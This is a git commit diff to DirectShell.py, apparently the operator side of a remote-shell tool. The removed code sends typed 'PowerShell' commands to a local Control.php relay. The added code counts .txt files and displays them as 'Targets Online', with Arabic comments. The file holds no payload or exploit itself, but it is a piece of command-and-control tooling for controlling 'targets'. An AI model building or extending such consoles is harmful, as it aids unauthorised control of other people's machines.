3daa96600f8512bfe18eac3cd5be94706a5d1b70
AbdulazizDXT <143551117+AzizDXT@users.noreply.github.com>
2023-11-27 20:59:23 +0400

    Update DirectShell.py

--- DirectShell.py
+++ DirectShell.py
@@ -1,34 +1,49 @@
-import requests
 import os
 import time
 from termcolor import *
 
-os.system("clear")
-os.system("figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf Global | lolcat")
-os.system("figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf  PShell | lolcat")
-print("=" * 40)
+def count_txt_files(folder_path):
+    # احصل على جميع الملفات في المجلد
+    all_files = os.listdir(folder_path)
+    
+    # احتسب عدد ملفات txt
+    txt_files = [file for file in all_files if file.endswith(".txt")]
+    
+    return len(txt_files)
 
-while True:
-    try:
-        if os.path.exists('Data.io'):
-            os.remove('Data.io')
+def main():
+    folder_path = "."  # استبدل بمسار المجلد الخاص بك
 
-        data = input("PowerShell >>> ")
+    # احصل على العدد الأولي للملفات
+    previous_count = count_txt_files(folder_path)
+
+    if previous_count == 0:
+        os.system("clear")
+        os.system(f"figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf Targets Data  | lolcat")
         print("")
+        x = colored("[+] No Targets Connected!", 'red')
+        print(x)
+        print("")
+        os.system(f"figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf 0 | lolcat")
 
-        if data.lower() == 'exit':
-            break
+    while True:
+        # احصل على العدد الحالي للملفات
+        current_count = count_txt_files(folder_path)
 
-        response = requests.post(f'http://localhost:8080/Control.php', data={'data': data})
-        X = colored(response.text, 'green')
-        print(X)
-        time.sleep(10)
-        if os.path.exists('Data.io'):
-            os.remove('Data.io')
+        # قارن بين العددين
+        if current_count != previous_count:
+            # إذا كان هناك تغيير، قم بطباعة العدد الجديد
+            os.system("clear")
+            os.system(f"figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf Targets Data | lolcat")
+            print("")
+            print(f"Targets Online : ")
+            print("")
+            os.system(f"figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf {current_count} | lolcat")
+            # حدث العدد السابق
+            previous_count = current_count
 
-    except IndentationError:
-        print("IndentationError occurred, skipping...")
-        continue
+        # انتظر لبضع ثواني قبل الفحص التالي
+        time.sleep(1)  # يمكنك تعديل هذا حسب احتياجاتك
 
-if __name__ == '__main__':
-    send_data()
+if __name__ == "__main__":
+    main()
